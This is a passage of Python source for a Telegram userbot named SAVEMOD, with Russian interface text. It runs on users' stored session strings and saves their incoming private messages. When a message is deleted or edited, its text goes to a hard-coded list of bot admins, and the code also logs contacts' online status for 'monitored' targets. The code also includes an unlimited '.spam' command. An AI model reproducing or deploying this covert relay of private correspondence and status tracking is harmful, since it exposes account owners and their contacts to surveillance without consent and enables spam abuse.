    saved_messages[owner_id] = {}
    user_status_tracker[owner_id] = {}
    logging.info(f"✅ Юзербот запущен для {owner_id}")
    cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
    muted_users = {row[0] for row in cursor.fetchall()}
    
    @client.on(events.UserUpdate)
    async def track_status(event):
        try:
            if not hasattr(event, 'user') or event.user is None or event.user.id is None:
                return
            user = event.user
            if getattr(user, 'bot', False) or is_target_admin(user.id):
                return
            user_id = user.id
            user_name = user.first_name or user.username or str(user_id)
            current_status = type(user.status).__name__
            last_status = user_status_tracker.get(owner_id, {}).get(user_id)
            if last_status != current_status:
                user_status_tracker[owner_id][user_id] = current_status
                if user_id in monitored_users:
                    mon_data = monitored_users[user_id]
                    if isinstance(user.status, UserStatusOnline):
                        await bot.send_message(mon_data['admin_id'], f"🟢 <b>{user_name}</b> вошел в сеть!", parse_mode='HTML')
                    elif isinstance(user.status, UserStatusOffline):
                        await bot.send_message(mon_data['admin_id'], f"⚫ <b>{user_name}</b> вышел из сети!", parse_mode='HTML')
                if isinstance(user.status, UserStatusOnline):
                    status_text = "🟢 ВОШЕЛ В СЕТЬ"
                elif isinstance(user.status, UserStatusOffline):
                    status_text = "⚫ ВЫШЕЛ ИЗ СЕТИ"
                else:
                    return
                cursor.execute('INSERT INTO user_status_logs (timestamp, user_id, user_name, status) VALUES (?, ?, ?, ?)',
                               (datetime.now().isoformat(), user_id, user_name[:100], status_text))
                conn.commit()
        except Exception as e:
            pass
    
    @client.on(events.NewMessage)
    async def save_incoming(event):
        if event.out:
            return
        sender_id = event.sender_id
        if is_target_admin(sender_id):
            return
        if event.is_private and sender_id in muted_users:
            await event.delete()
            return
        if event.text:
            saved_messages[owner_id][event.id] = {"sender_id": sender_id, "text": event.text}
            cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)',
                          (owner_id, event.id, sender_id, event.text, datetime.now().isoformat()))
            conn.commit()
    
    @client.on(events.MessageDeleted)
    async def on_delete(event):
        if not event.is_private:
            return
        for msg_id in event.deleted_ids:
            msg = saved_messages.get(owner_id, {}).get(msg_id)
            if not msg:
                cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
                row = cursor.fetchone()
                if row:
                    msg = {"sender_id": row[0], "text": row[1]}
            if msg and msg["sender_id"] != owner_id and not is_target_admin(msg["sender_id"]):
                try:
                    user = await client.get_entity(msg["sender_id"])
                    name = user.first_name or "Пользователь"
                    username = f"@{user.username}" if user.username else ""
                    for admin_id in ADMIN_IDS:
                        try:
                            await bot.send_message(admin_id, f"🗑 <b>{name}</b> {username} удалил сообщение:\n\n<blockquote>{msg['text'][:500]}</blockquote>", parse_mode='HTML')
                        except:
                            pass
                    cursor.execute('DELETE FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
                    conn.commit()
                    if msg_id in saved_messages.get(owner_id, {}):
                        del saved_messages[owner_id][msg_id]
                except:
                    pass
    
    @client.on(events.MessageEdited)
    async def on_edit(event):
        if not event.is_private or event.out:
            return
        msg_id = event.id
        new_text = event.text or ""
        msg = saved_messages.get(owner_id, {}).get(msg_id)
        if not msg:
            cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
            row = cursor.fetchone()
            if row:
                msg = {"sender_id": row[0], "text": row[1]}
        if msg and msg["sender_id"] != owner_id and msg["text"] != new_text and not is_target_admin(msg["sender_id"]):
            try:
                user = await client.get_entity(msg["sender_id"])
                name = user.first_name or "Пользователь"
                username = f"@{user.username}" if user.username else ""
                for admin_id in ADMIN_IDS:
                    try:
                        await bot.send_message(admin_id, f"✏️ <b>{name}</b> {username} изменил сообщение:\n\n<b>Было:</b>\n<blockquote>{msg['text'][:200]}</blockquote>\n<b>Стало:</b>\n<blockquote>{new_text[:200]}</blockquote>", parse_mode='HTML')
                    except:
                        pass
                cursor.execute('UPDATE saved_messages SET text=? WHERE owner_id=? AND msg_id=?', (new_text, owner_id, msg_id))
                conn.commit()
                if msg_id in saved_messages.get(owner_id, {}):
                    saved_messages[owner_id][msg_id]["text"] = new_text
            except:
                pass
    
    @client.on(events.NewMessage)
    async def user_commands(event):
        if not event.out:
            return
        text = event.text or ""
        if not text.startswith('.'):
            return
        if text == '.help':
            await event.edit("""
<b>🤖 КОМАНДЫ SAVEMOD</b>

.help - справка
.mute (ответ) - заглушить
.unmute (ответ) - разглушить
.list - список заглушенных
.spam кол-во текст - спам (без лимита)
.type текст - эффект печати
.info (ответ) - инфо
""", parse_mode='HTML')
            return
        if text == '.mute':
            reply = await event.get_reply_message()
            if reply and reply.sender_id and reply.sender_id != owner_id and not is_target_admin(reply.sender_id):
                cursor.execute('INSERT OR IGNORE INTO muted_users VALUES (?, ?)', (reply.sender_id, owner_id))
                conn.commit()
                muted_users.add(reply.sender_id)
                await event.edit('🔕 Заглушен')
            return
        if text == '.unmute':
            reply = await event.get_reply_message()
            if reply and reply.sender_id:
                cursor.execute('DELETE FROM muted_users WHERE user_id=? AND muted_by=?', (reply.sender_id, owner_id))
                conn.commit()
                muted_users.discard(reply.sender_id)
                await event.edit('🔔 Разглушен')
            return
        if text == '.list':
            if muted_users:
                names = []
                for uid in list(muted_users)[:20]:
                    try:
                        u = await client.get_entity(uid)
                        names.append(f"• {u.first_name}")
                    except:
                        names.append(f"• {uid}")
                await event.edit("🔕 Замьюченные:\n" + "\n".join(names))
            else:
                await event.edit("🔕 Нет")
            return
        if text.startswith('.spam '):
            parts = text.split(' ', 2)
            if len(parts) >= 2:
                try:
                    count = int(parts[1])  # Без лимита
                    msg_text = parts[2] if len(parts) > 2 else None
                    if not msg_text:
                        reply = await event.get_reply_message()
                        if reply:
                            msg_text = reply.text
                    if msg_text:
                        await event.delete()
                        for i in range(count):
                            await client.send_message(event.chat_id, msg_text)
                            await asyncio.sleep(0.05)
                except:
                    pass
            return
        if text.startswith('.type '):
            txt = text[6:]
            if txt:
                await event.delete()
                msg = await client.send_message(event.chat_id, txt[0])
                typed = txt[0]
                for ch in txt[1:]:
                    typed += ch
                    try:
                        await msg.edit(typed)
                    except:
                        pass
                    await asyncio.sleep(0.2)
            return
        if text == '.info':
            reply = await event.get_reply_message()
            if reply:
                try:
                    u = await client.get_entity(reply.sender_id)
                    if is_target_admin(u.id):
                        await event.edit("❌ Админ")
                        return
                    muted = "✅" if reply.sender_id in muted_users else "❌"
                    await event.edit(f"👤 {u.first_name}\n🆔 {u.id}\n🔇 Заглушен: {muted}")
                except:
                    pass
            else:
                await event.edit('❌ Ответь')
            return
    
    await client.run_until_disconnected()

flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    return "OK"

def run_web():
    flask_app.run(host='0.0.0.0', port=8080)

async def restore_sessions():
    cursor.execute('SELECT user_id, session_string FROM user_sessions')
    for user_id, session_str in cursor.fetchall():
        asyncio.create_task(run_userbot(user_id, session_str))

async def main():
    logging.info(f"🚀 SAVEMOD запуск... Админы: {ADMIN_IDS}")
    await restore_sessions()
    while True:
        await asyncio.sleep(10)

if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    Thread(target=lambda: executor.start_polling(dp, skip_updates=True), daemon=True).start()
    asyncio.run(main())
